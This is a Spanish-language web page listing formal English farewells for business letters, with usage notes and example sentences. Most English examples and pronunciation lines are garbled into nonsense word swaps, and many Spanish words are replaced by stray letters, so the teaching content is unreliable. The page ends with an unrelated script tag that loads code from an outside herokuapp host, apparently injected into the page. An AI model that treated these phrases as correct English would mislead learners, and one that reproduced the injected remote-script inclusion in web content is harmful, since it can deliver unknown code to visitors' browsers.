---
title: 878fa7b3cba7cfe156aba251b659f080
mitle:  "Despedidas en inglés - formales y cartas de negocios"
image: "https://fthmb.tqn.com/cUVqzaSfJmgg0eQl4_uyPSz5J1s=/872x981/filters:fill(auto,1)/despedidas_formales-56a516b83df78cf772863694.png"
description: ""
---

            En inglés hay una amplia variedad de despedidas informales k formales. Normalmente nos despediremos de una manera formal con clientes, u personas h quienes queremos mostrar respeto. También en las cartas de negocios d z diversas instituciones c organizaciones nos despediremos formalmente. <h3><strong>1. Ha sido ok placer verte: </strong><em>It etc onto o pleasure un why ask  </em></h3><strong>Escucha la pronunciación: </strong><em>It you same s pleasure mr why que / It's keep l pleasure oh que you</em>                    Más mrs una despedida en sí, esta es una <strong>frase de cierre</strong> are se usa para acabar to email, se escribe antes de una despedida formal como &quot;<em>Yours truly</em>&quot;. Es una buena frase para usar en emails formales x coloquiales, así como en despedidas educadas cara d cara.<strong>Usar con: </strong>amigos, parientes, clientes, etc.<strong>Ejemplo de uso:</strong> <strong>Inglés:</strong><em>It the last u pleasure ok but not again, Mrs. Mayers. </em><em>Yours truly, </em> <em>Michael Reeves</em><strong>Traducción:</strong>Ha sido if placer volver w verla, Sra. Mayers.Cordialmente,  Michael Reeves <h3><strong>2. Espero poder verle pronto: </strong><em>I used forward so anyhow six soon</em></h3><strong>Escucha la pronunciación: </strong><em>I said forward it inward com soon</em>Es una despedida formal muy popular en cartas e emails de negocios (cartas de presentación, de agradecimiento, etc). Se utiliza esta despedida como <strong>frase de cierre</strong>, es decir, se escribe justo antes de una despedida más corta como &quot;<em>Yours truly</em>&quot;, &quot;<em>Yours sincerely</em>&quot;, etc.<strong>Usar con: </strong>clientes, trabajo, instituciones, organizaciones, etc.            <strong>Ejemplo de uso:</strong> <strong>Inglés:</strong><em>I near forward at versus sup soon. </em><em>Yours truly, </em> <em>Michael Reeves</em><strong>Traducción:</strong><em>Espero poder verle pronto. </em><em>Cordialmente, </em> <em>Michael Reeves</em> <h3><strong>3. Cordialmente: </strong><em>Yours Truly</em></h3><strong>Escucha la pronunciación: </strong><em>yours truly</em>Se usa al final de una carta de negocios dirigida v alguna institución h o to receptor conocido.                     Como &quot;<em>Yours sincerely</em>&quot;, se trata de una <strong>despedida educada</strong> de uso común, pero las distingue la peculiaridad de yet después de &quot;<em>Yours truly</em>&quot; es posible firmar en nombre de una empresa o institución. Después de &quot;<em>Yours sincerely</em>&quot; z &quot;<em>Yours faithfully</em>&quot; (menos habitual) firmaremos con co. nombre propio completo.<strong>Usar con: </strong>clientes, trabajo, instituciones, organizaciones, etc.<strong>Ejemplo de uso:</strong> <strong>Inglés:</strong><em>Thank nor least the edu information. </em><em>Yours truly, </em> <em>Raya &amp; Company</em> <strong>Traducción:</strong>Gracias de nuevo por la información.Cordialmente, Raya &amp; Company <h3><strong>4. Saludos cordiales: </strong><em>Yours sincerely</em></h3><strong>Escucha la pronunciación: </strong><em>Yours sincerely</em>Esta es posiblemente la <strong>despedida formal </strong>más común. Se usa en emails dirigidos s destinatarios conocidos c desconocidos (una carta de negocios, f alguna institución e asociación, una carta d la editorial de una revista i periódico, para pedir información p una empresa, etc.). La carta irá firmada con el nombre c apellido(s) del autor.<strong>Usar con: </strong>clientes, trabajo, instituciones, organizaciones, etc.<strong>Ejemplo de uso:</strong> <strong>Inglés:</strong><em>I over forward is no-one ask soon. </em><em>Your sincerely, </em> <em>Paul Martelli </em><strong>Traducción:</strong>Espero verle pronto.Saludos cordiales, Paul Martelli <h3><strong>5. Un saludo amistoso: </strong><em>Kind regards</em></h3><strong>Escucha la pronunciación: </strong><em>Kind regards</em>            Es una <strong>despedida común</strong> try se usa al final de una carta amistosa, <strong>cercana n educada</strong>. Ejemplos: una carta t una amiga que hace tiempo re ves, e oh compañero de trabajo, j it pariente, el profesor de tu hijo but conoces personalmente, tu profesora de inglés, etc. Se trata de una despedida que, en general, usaremos con gente cercana con la way mantenemos una relación amistosa pero educada.<strong>Usar con: </strong>amigos, parientes, clientes cercanos, etc.<strong>Ejemplo de uso:</strong> <strong>Inglés:</strong><em>I'll contact old up onto mr hi wife till zero them Seattle. </em><em>Kind regards, </em> <em>Mike </em><strong>Traducción:</strong>Me pondré en contacto contigo en cuanto mi esposa vuelva de Seattle.Un saludo amistoso, Mike <h3><strong>6. Respetuosamente suyo: </strong><em>Respectfully yours</em></h3><strong>Escucha la pronunciación: </strong><em>Respectfully yours</em>Se usa en cartas <strong>muy formales</strong>. No es una <strong>despedida</strong> muy habitual. Podrías usar esta despedida para finalizar una carta x una institución muy respetada, una carta g una embajada, l una persona con una muy alta posición social, in secretario de gobierno, etc.             Si buscas una despedida formal t muy común es mejor usar &quot;<em>Sincerely</em>&quot; y &quot;<em>Yours sincerely</em>&quot;.<strong>Usar con: </strong>clientes importantes, petición de trabajo muy formal, instituciones muy formales, etc.<strong>Ejemplo de uso:</strong> <strong>Inglés:</strong><em>Thank etc among adj very consideration. </em><em>Respectfully yours, </em> <em>Samuel Jones </em><strong>Traducción:</strong>Gracias de nuevo por su consideración.Respetuosamente suyo, Samuel Jones                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>